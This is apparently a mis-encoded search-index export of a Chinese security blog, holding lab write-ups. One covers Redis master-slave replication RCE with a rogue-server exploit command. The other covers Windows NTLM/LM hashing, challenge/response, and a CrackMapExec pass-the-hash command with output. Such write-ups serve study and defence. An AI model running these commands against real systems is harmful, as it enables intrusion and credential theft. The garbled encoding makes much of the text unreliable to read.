æ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨ redis ä¸­å®ç°ä¸€ä¸ªæ–°çš„ Redis å‘½ä»¤ï¼Œé€šè¿‡å†™ c è¯­è¨€å¹¶ç¼–è¯‘å‡º .so æ–‡ä»¶ã€‚ ç¼–å†™æ¶æ„ so æ–‡ä»¶çš„ä»£ç  https://github.com/RicterZ/RedisModules-ExecuteCommand git clone åï¼Œè¿›å…¥ç›®å½•ï¼Œç”¨makeå‘½ä»¤ç¼–è¯‘å³å¯è·å¾— .so åº“æ–‡ä»¶ã€‚ ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:2","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"åˆ©ç”¨åŸç† åœ¨ä¸¤ä¸ª Redis å®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedis çš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡ FULLRESYNC åŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½ so æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚ ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:0","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° ä½¿ç”¨æ¨¡æ‹Ÿçš„æ¶æ„æœåŠ¡ç«¯æ¥ä½œä¸ºä¸»æœºï¼Œå¹¶æ¨¡æ‹Ÿ fullresync è¯·æ±‚ã€‚ https://github.com/LoRexxar/redis-rogue-server (æ³¨ï¼šä½œè€…åˆ©ç”¨çš„æ˜¯ python3.7 ç¯å¢ƒæˆåŠŸæ‰§è¡Œ) ç„¶åå¯ç”¨ redis 5.0 çš„ docker ç„¶åç›´æ¥é€šè¿‡ POC æ¥æ”»å‡»æœåŠ¡ç«¯ python3 redis-rogue-server.py --rhost 172.18.0.2 --rport 6379 --lhost 172.18.0.1 (æ³¨ï¼šåœ¨ docker ç¯å¢ƒä¸‹åå¼¹ shell ä¼šå‡ºç°é—®é¢˜ï¼Œå› æ­¤æœ¬æ–‡ä¸­çš„ lhost ä½¿ç”¨çš„æ˜¯ docker å®¿ä¸»æœºçš„å†…ç½‘ IPã€‚ä½œè€…åœ¨ä½¿ç”¨å¤–ç½‘ IP çš„æ—¶å€™ï¼Œä¼šå¼¹å‡ºé”™è¯¯) ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:0","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windowsè®¤è¯ç›¸å…³","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows è®¤è¯ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows æœ¬åœ°è®¤è¯ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æœ¬åœ°è®¤è¯åŸºç¡€ åœ¨æœ¬åœ°ç™»å½• Windows çš„æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å¯†ç ä½œä¸ºå‡­è¯å»ä¸ç³»ç»Ÿä¸­çš„å¯†ç è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿä¸­çš„å¯†ç å­˜å‚¨åœ¨å“ªé‡Œå‘¢ï¼Ÿ è·¯å¾„ï¼š%SystemRoot%\\system32\\config\\sam å½“æˆ‘ä»¬ç™»å½•ç³»ç»Ÿçš„æ—¶å€™,ç³»ç»Ÿä¼šè‡ªåŠ¨åœ°è¯»å– SAM æ–‡ä»¶ä¸­çš„â€œå¯†ç â€ä¸æˆ‘ä»¬è¾“å…¥çš„â€œå¯†ç â€è¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœç›¸åŒï¼Œè¯æ˜è®¤è¯æˆåŠŸ! è¿™ä¸ª SAM æ–‡ä»¶ä¸­ä¿ç•™äº†è®¡ç®—æœºæœ¬åœ°æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯ä¿¡æ¯ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªæ•°æ®åº“ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"NTLM(NT LAN Manager) Hash NTLM Hash æ˜¯æ”¯æŒ Net NTLM è®¤è¯åè®®åŠæœ¬åœ°è®¤è¯è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªé‡è¦å‚ä¸ç‰©ï¼Œå…¶é•¿åº¦ä¸º 32 ä½ï¼Œç”±æ•°å­—ä¸å­—æ¯ç»„æˆã€‚ Windows æœ¬èº«ä¸å­˜å‚¨ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œå®ƒä¼šå°†ç”¨æˆ·çš„æ˜æ–‡å¯†ç ç»è¿‡åŠ å¯†ç®—æ³•åå­˜å‚¨åœ¨ SAM æ•°æ®åº“ä¸­ã€‚ å½“ç”¨æˆ·ç™»å½•æ—¶,å°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç ä¹ŸåŠ å¯†æˆ NTLM Hash,ä¸ SAM æ•°æ®åº“ä¸­çš„ NTLM Hash è¿›è¡Œæ¯”è¾ƒã€‚NTLM Hash çš„å‰èº«æ˜¯ LM Hashï¼Œç›®å‰åŸºæœ¬æ·˜æ±°ï¼Œä½†æ˜¯è¿˜æ˜¯å­˜åœ¨ã€‚ NTLM Hashâ€”â€”äº§ç”Ÿ admin =\u003e 209c6174da490caeb422f3fa5a7ae634 admin -\u003e hex(16è¿›åˆ¶ç¼–ç ) = 61646d69e 61646d69e -\u003e unicode = 610064006d0069006e00 610064006d0069006e00 -\u003e MD4 = 209c6174da490caeb422f3fa5a7ae634 æœ¬åœ°è®¤è¯æµç¨‹ Windows Logon Process(å³ winlogon.exe æ˜¯ Windows NT ç”¨æˆ·ç™»é™†ç¨‹åºï¼Œç”¨äºç®¡ç†ç”¨æˆ·ç™»å½•å’Œé€€å‡ºã€‚ LSASS æ˜¯å¾®è½¯ Windows ç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€‚ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"LM Hash å°†æ‰€æœ‰å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯ 123ABC //æœªè¾¾åˆ°7ä¸ªå­—ç¬¦ å°†å¯†ç è½¬åŒ–ä¸º 16 è¿›åˆ¶ï¼Œåˆ†ä¸¤ç»„ï¼Œå¡«å……ä¸º 14 ä¸ªå­—ç¬¦ï¼Œç©ºä½™ä½ä½¿ç”¨ 0x00 å­—ç¬¦å¡«è¡¥ 31323341424300000000000000 å°†å¯†ç åˆ†å‰²ä¸ºä¸¤ç»„ 7 ä¸ªå­—èŠ‚çš„å— 31323341424300 000000000000 //16 è¿›åˆ¶ å°†æ¯ç»„è½¬åŒ–ä¸ºæ¯”ç‰¹æµ,ä¸è¶³ 56Bit åˆ™åœ¨å·¦è¾¹åŠ  0 31323341424300 -\u003e (è½¬æ¢ä¸ºäºŒè¿›åˆ¶) 11000100110010001100110100001010000100100001100000000-\u003e(è¡¥è¶³ 56Bit) 00110001001100100011001101000001010000100100001100000000 å°†æ¯”ç‰¹æµæŒ‰ç…§ 7 æ¯”ç‰¹ä¸€ç»„ï¼Œåˆ†å‡º 8 ç»„ï¼Œæœ«å°¾åŠ  0 ç”±äºåè€…éƒ½ä¸º 0ï¼Œç»“æœå¯æƒ³è€ŒçŸ¥ï¼Œé‚£å°±éƒ½æ˜¯ 0; å°†æ¯ç»„æ¯”ç‰¹æµè½¬æ¢ä¸º 16 è¿›åˆ¶ä½œä¸ºè¢«åŠ å¯†çš„å€¼ï¼Œä½¿ç”¨ DES åŠ å¯†ï¼Œå­—ç¬¦ä¸² KGS!@#$% ä¸ºKey(0x4B47532140232425)ï¼Œå¾—åˆ° 8 ä¸ªç»“æœï¼Œæ¯ä¸ªç»“æœè½¬æ¢ä¸º 16 è¿›åˆ¶ã€‚ -\u003e 00110000100110001000110001101000000101000001001000001100 00000000 -\u003e30988C6814120C00 -\u003e DES(30988C6814120C00) -\u003e 48-D7-EB-91- 2F-5E-69-7C ç”±äºæˆ‘ä»¬çš„å¯†ç ä¸è¶…è¿‡ 7 å­—èŠ‚ï¼Œæ‰€ä»¥åé¢çš„ä¸€åŠæ˜¯å›ºå®šçš„: AA-D3-B4-35-B5-14-04-EE è¿æ¥ä¸¤ä¸ª DES åŠ å¯†å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ LM å“ˆå¸Œã€‚ 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windowsç½‘ç»œè®¤è¯ åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œç»å¸¸é‡åˆ°å·¥ä½œç»„ç¯å¢ƒï¼Œè€Œå·¥ä½œç»„ç¯å¢ƒæ˜¯ä¸€ä¸ªé€»è¾‘ä¸Šçš„ç½‘ç»œç¯å¢ƒ(å·¥ä½œåŒº)ï¼Œéš¶å±äºå·¥ä½œç»„çš„æœºå™¨ä¹‹é—´æ— æ³•äº’ç›¸å»ºç«‹ä¸€ä¸ªå®Œç¾çš„ä¿¡ä»»æœºåˆ¶ï¼Œåªèƒ½ç‚¹å¯¹ç‚¹ï¼Œæ˜¯æ¯”è¾ƒè½åçš„è®¤è¯æ–¹å¼ï¼Œæ²¡æœ‰ä¿¡æ‰˜æœºæ„ã€‚ å‡è®¾ A ä¸»æœºä¸ B ä¸»æœºå±äºåŒä¸€ä¸ªå·¥ä½œç»„ç¯å¢ƒï¼ŒA æƒ³è®¿é—® B ä¸»æœºä¸Šçš„èµ„æ–™ï¼Œéœ€è¦å°†ä¸€ä¸ªå­˜åœ¨äº B ä¸»æœºä¸Šçš„è´¦æˆ·å‡­è¯å‘é€è‡³ B ä¸»æœºï¼Œç»è¿‡è®¤è¯æ‰èƒ½å¤Ÿè®¿é—® B ä¸»æœºä¸Šçš„èµ„æºã€‚ è¿™æ˜¯æˆ‘ä»¬æ¥è§¦æ¯”è¾ƒå¤šçš„ SMB å…±äº«æ–‡ä»¶çš„æ¡ˆä¾‹ï¼ŒSMB çš„é»˜è®¤ç«¯å£æ˜¯ 445ã€‚ æ—©æœŸ SMB åè®®åœ¨ç½‘ç»œä¸Šä¼ è¾“æ˜æ–‡å£ä»¤ã€‚åæ¥å‡ºç° LAN Manager Challenge/Response éªŒè¯æœºåˆ¶ï¼Œç®€ç§° LMï¼Œå®ƒæ˜¯å¦‚æ­¤ç®€å•ä»¥è‡³å¾ˆå®¹æ˜“å°±è¢«ç ´è§£ï¼Œç°åœ¨åˆæœ‰äº† NTLM v2 ä»¥åŠ Kerberosã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Challenge/Response ç¬¬ä¸€æ­¥ï¼šåå•† å®¢æˆ·ç«¯ä¸»è¦åœ¨è¿™ä¸€æ­¥å‘æœåŠ¡å™¨ç¡®è®¤åè®®çš„ç‰ˆæœ¬ï¼Œæ˜¯ v1 è¿˜æ˜¯ v2ã€‚ä¸æ­¢è€…ä¸€ç‚¹ç‚¹ ç¬¬äºŒæ­¥ï¼šè´¨è¯¢å®Œæ•´è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€ç”¨æˆ·ä¿¡æ¯(ç”¨æˆ·å)è¯·æ±‚ æœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚ï¼Œç”Ÿæˆä¸€ä¸ª 16 ä½çš„éšæœºæ•°ï¼Œè¢«ç§°ä¹‹ä¸ºâ€œChallengeâ€ï¼Œ ä½¿ç”¨ç™»å½•ç”¨æˆ·åå¯¹åº”çš„ NTLM Hash åŠ å¯† Challenge (16 ä½éšæœºå­—ç¬¦)ï¼Œç”Ÿæˆ Challenge1ã€‚åŒæ—¶ï¼Œç”Ÿæˆ Challenge1 åï¼Œå°† Challenge (16 ä½éšæœºå­—ç¬¦)å‘é€ç»™å®¢æˆ·ç«¯ã€‚//Net NTLM Hash = NTLM Hash(Challenge) å®¢æˆ·ç«¯æ¥å—åˆ° Challenge åï¼Œä½¿ç”¨å°†è¦ç™»å½•åˆ°è´¦æˆ·å¯¹åº”çš„ NTLM Hash åŠ å¯† Challenge ç”Ÿæˆ Responseï¼Œç„¶åå°† Response å‘é€è‡³æœåŠ¡å™¨ç«¯ã€‚ ç¬¬ä¸‰æ­¥ï¼šéªŒè¯ æœåŠ¡å™¨ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ Response åï¼Œæ¯”å¯¹ Chanllenge1 ä¸ Response æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™è®¤è¯é€šè¿‡ã€‚ ä½¿ç”¨å¦å¤–ä¸€ç§æ–¹å¼è§£è¯»ï¼š Server æ¥æ”¶åˆ° Client å‘é€çš„ç”¨æˆ·ååï¼Œåˆ¤æ–­æœ¬åœ°è´¦æˆ·åˆ—è¡¨æ˜¯å¦æœ‰ç”¨æˆ·å share_userï¼Œ å¦‚æœæ²¡æœ‰ï¼Œè¿”å›è®¤è¯å¤±è´¥ï¼› å¦‚æœæœ‰ï¼Œç”Ÿæˆ Chanllengeï¼Œå¹¶ä¸”ä»æœ¬åœ°æŸ¥æ‰¾ share_user å¯¹åº”çš„ NTLM Hashï¼Œä½¿ç”¨ NTLM Hash åŠ å¯† Chanllengeï¼Œç”Ÿæˆä¸€ä¸ª Net-NTLM Hash å­˜åœ¨å†…å­˜ä¸­ï¼Œå¹¶å°† Chanllenge å‘é€ç»™ Clientã€‚ Client æ¥æ”¶åˆ° Chanllenge åï¼Œå°†è‡ªå·±æä¾›çš„ share_user çš„å¯†ç è½¬æ¢ä¸º NTLM Hashï¼Œä½¿ç”¨ NTLM Hash åŠ å¯† Chanllengeï¼Œè¿™ä¸ªç»“æœå« Responseï¼Œè¡¨ç°å½¢å¼æ˜¯ Net-NTLM Hashï¼Œæœ€åå°† Response å‘é€ç»™ Serverã€‚ Server æ¥æ”¶åˆ° Client å‘é€çš„ Responseï¼Œå°† Response ä¸ä¹‹å‰çš„ Net-NTLM Hash è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è®¤è¯é€šè¿‡ã€‚ æ³¨æ„: Chanllenge æ˜¯ Server äº§ç”Ÿçš„ä¸€ä¸ª 16 å­—èŠ‚çš„éšæœºæ•°ï¼Œæ¯æ¬¡è®¤è¯éƒ½ä¸åŒ Response çš„è¡¨ç°å½¢å¼æ˜¯ Net-NTLM Hashï¼Œå®ƒæ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„å¯†ç  Hash åŠ å¯† Server è¿”å›çš„ Chanllenge äº§ç”Ÿçš„ç»“æœã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"NTLM v2 NTLM v1 ä¸ NTLM v2 æœ€æ˜¾è‘—çš„åŒºåˆ«å°±æ˜¯ Challenge ä¸åŠ å¯†ç®—æ³•ä¸åŒï¼Œå…±åŒç‚¹å°±æ˜¯åŠ å¯†çš„åŸæ–™éƒ½æ˜¯ NTLM Hashã€‚ ä¸‹é¢ç»†è¯´ä¸€ä¸‹æœ‰ä»€ä¹ˆä¸åŒ: Challengeï¼šNTLM v1 çš„ Challenge æœ‰ 8 ä½ï¼ŒNTLM v2 çš„ Challenge ä¸º 16 ä½ Net-NTLM Hashï¼šNTLM v1 çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯ DESï¼ŒNTLM v2 çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯ HMAC-MD5ã€‚ //Responderã€smbexec ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Pass The Hash åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šéœ€è¦æŠ“å–ç®¡ç†å‘˜çš„å¯†ç ã€NTLM Hashï¼Œé€šè¿‡æœé›†è¿™äº›ä¿¡æ¯æœ‰åŠ©äºæˆ‘ä»¬æ‰©å¤§æˆ˜æœï¼Œå°¤å…¶æ˜¯åœ¨åŸŸç¯å¢ƒä¸‹ã€‚ ä»€ä¹ˆæ˜¯å“ˆå¸Œä¼ é€’? å“ˆå¸Œä¼ é€’æ˜¯èƒ½å¤Ÿåœ¨ä¸éœ€è¦è´¦æˆ·æ˜æ–‡å¯†ç çš„æƒ…å†µä¸‹å®Œæˆè®¤è¯çš„ä¸€ä¸ªæŠ€æœ¯ã€‚ å“ˆå¸Œä¼ é€’çš„ä½œç”¨? è§£å†³äº†æˆ‘ä»¬æ¸—é€ä¸­è·å–ä¸åˆ°æ˜æ–‡å¯†ç ã€ç ´è§£ä¸äº† NTLM Hash è€Œåˆæƒ³æ‰©å¤§æˆ˜æœçš„é—®é¢˜ã€‚ å¿…è¦æ¡ä»¶ å“ˆå¸Œä¼ é€’éœ€è¦è¢«è®¤è¯çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®åˆ°æœåŠ¡å™¨ å“ˆå¸Œä¼ é€’éœ€è¦è¢«ä¼ é€’è®¤è¯çš„ç”¨æˆ·å å“ˆå¸Œä¼ é€’éœ€è¦è¢«ä¼ é€’è®¤è¯ç”¨æˆ·çš„ NTLM Hash åŸç†åˆ†æ è¦å®Œæˆä¸€ä¸ª NTLM è®¤è¯ï¼Œç¬¬ä¸€æ­¥éœ€è¦å®¢æˆ·ç«¯å°†è‡ªå·±è¦å‚ä¸è®¤è¯çš„ç”¨æˆ·åå‘é€è‡³æœåŠ¡å™¨ç«¯ï¼Œç­‰å¾…æœåŠ¡å™¨ç«¯ç»™å‡ºçš„ Challenge å…¶å®å“ˆå¸Œä¼ é€’å°±æ˜¯ä½¿ç”¨ç”¨æˆ·åå¯¹åº”çš„ NTLM Hash å°†æœåŠ¡å™¨ç»™å‡ºçš„ Chanllenge åŠ å¯†ï¼Œç”Ÿæˆä¸€ä¸ª Responseï¼Œæ¥å®Œæˆè®¤è¯ã€‚ Pass The Hash èƒ½å¤Ÿå®Œæˆä¸€ä¸ªä¸éœ€è¦è¾“å…¥å¯†ç çš„ NTLM åè®®è®¤è¯æµç¨‹ï¼Œæ‰€ä»¥ä¸ç®—æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œç®—æ˜¯ä¸€ä¸ªæŠ€å·§ã€‚ Pass The Hashçš„å·¥å…·ï¼š Smbmap CrackMapExec Smbexec Metasploit ä½¿ç”¨ CrackMapExec å®ç° Hash ä¼ é€’ï¼š root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami SMB 192.168.3.5 445 LIYINGZHEA30B [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True) SMB 192.168.3.5 445 LIYINGZHEA30B [+] PAYLOADS\\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"KerberosåŸŸè®¤è¯ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Active Directory(æ´»åŠ¨ç›®å½•)çš„æ¦‚å¿µ Windows æä¾›äº†ä¸ºä¼ä¸šç®¡ç†èµ„äº§ã€æœåŠ¡ã€ç½‘ç»œå¯¹è±¡è¿›è¡Œç»„ç»‡åŒ–çš„ç®¡ç†ï¼Œè¿™éå¸¸ç¬¦åˆä¼ä¸šæ¶æ„çš„ç®¡ç†æ¨¡å¼ã€‚è€Œæ‰¿è½½è¿™äº›ç®¡ç†æœºåˆ¶çš„å°±æ˜¯æ´»åŠ¨ç›®å½•æœåŠ¡ã€‚å¦‚æœè¦æ­å»ºä¸€ä¸ªåŸŸï¼Œå°±éœ€è¦å®‰è£…æ´»åŠ¨ç›®å½•æœåŠ¡ã€‚ æ´»åŠ¨ç›®å½•æœåŠ¡ä»¥åŸŸåæ¥åˆ’åˆ†åŸŸçš„è¾¹ç•Œï¼ŒåŸŸå¤–å°±ä¸å±äºç®¡ç†èŒƒå›´äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªåŸŸå¯¹åº”ä¸€ä¸ªåŸŸåï¼ŒåŸŸä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’ä¿¡ä»»ã€‚ Active Directory å­˜å‚¨äº†æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è®©ç®¡ç†å‘˜å’Œç”¨æˆ·èƒ½å¤Ÿè½»æ¾åœ°æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚Active Directory ä½¿ç”¨äº†ä¸€ç§ ç»“æ„åŒ–çš„æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåŸºç¡€å¯¹ç›®å½•ä¿¡æ¯è¿›è¡Œåˆä¹é€»è¾‘çš„åˆ†å±‚ç»„ç»‡ã€‚ ç½‘ç»œå¯¹è±¡åˆ†ä¸º:ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç»‡å•ä½ä»¥åŠå®‰å…¨ç­–ç•¥ç­‰ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Active Directory(æ´»åŠ¨ç›®å½•)çš„æ¦‚å¿µ æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºç®¡ç†:ç®¡ç†æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºè´¦æˆ·ï¼Œ æ‰€æœ‰æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºåŠ å…¥åŸŸç®¡ç†å¹¶å®æ–½ç»„ç­–ç•¥ã€‚ ç”¨æˆ·æœåŠ¡:ç®¡ç†ç”¨æˆ·åŸŸè´¦æˆ·ã€ç”¨æˆ·ä¿¡æ¯ã€ä¼ä¸šé€šè®¯å½•(ä¸ç”µå­é‚®ä»¶ç³»ç»Ÿé›†æˆ)ã€ç”¨æˆ·ç»„ç®¡ç†ã€ç”¨æˆ·èº«ä»½è®¤è¯ã€ç”¨æˆ·æˆæƒç®¡ç†ç­‰ï¼ŒæŒ‰çœå®æ–½ç»„ç®¡ç†ç­–ç•¥ã€‚ èµ„æºç®¡ç†:ç®¡ç†æ‰“å°æœºã€æ–‡ä»¶å…±äº«æœåŠ¡ç­‰ç½‘ç»œèµ„æºã€‚ æ¡Œé¢é…ç½®:ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é›†ä¸­çš„é…ç½®å„ç§æ¡Œé¢é…ç½®ç­–ç•¥ï¼Œå¦‚: ç”¨æˆ·ä½¿ç”¨åŸŸä¸­èµ„æºæƒé™é™åˆ¶ã€ç•Œé¢åŠŸèƒ½çš„é™åˆ¶ã€åº”ç”¨ç¨‹åºæ‰§è¡Œç‰¹å¾é™åˆ¶ã€ç½‘ç»œè¿æ¥é™åˆ¶ã€å®‰å…¨é…ç½®é™åˆ¶ç­‰ã€‚ åº”ç”¨ç³»ç»Ÿæ”¯æ’‘:æ”¯æŒè´¢åŠ¡ã€äººäº‹ã€ç”µå­é‚®ä»¶ã€ä¼ä¸šä¿¡æ¯é—¨æˆ·ã€åŠå…¬è‡ªåŠ¨åŒ–ã€è¡¥ä¸ç®¡ç†ã€é˜²ç—…æ¯’ç³»ç»Ÿç­‰å„ç§åº”ç”¨ç³»ç»Ÿã€‚ åœ¨åŸŸä¸­ï¼Œç½‘ç»œå¯¹è±¡å¯ä»¥ç›¸äº’è®¿é—®ï¼Œä½†æ˜¯åœ¨çœŸå®æƒ…å†µä¸­ï¼Œéœ€è¦å¯¹æŸäº›éƒ¨é—¨çš„è®¡ç®—æœºè¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚ï¼šé”€å”®éƒ¨é—¨ä¸èƒ½è®¿é—®æŠ€æœ¯éƒ¨é—¨çš„æœåŠ¡å™¨ã€‚ è¿™ä¸ªä¸­é—´å°±éœ€è¦ Kerberos è®¤è¯åè®®æ¥éªŒè¯ç½‘ç»œå¯¹è±¡é—´çš„æƒé™ã€‚ 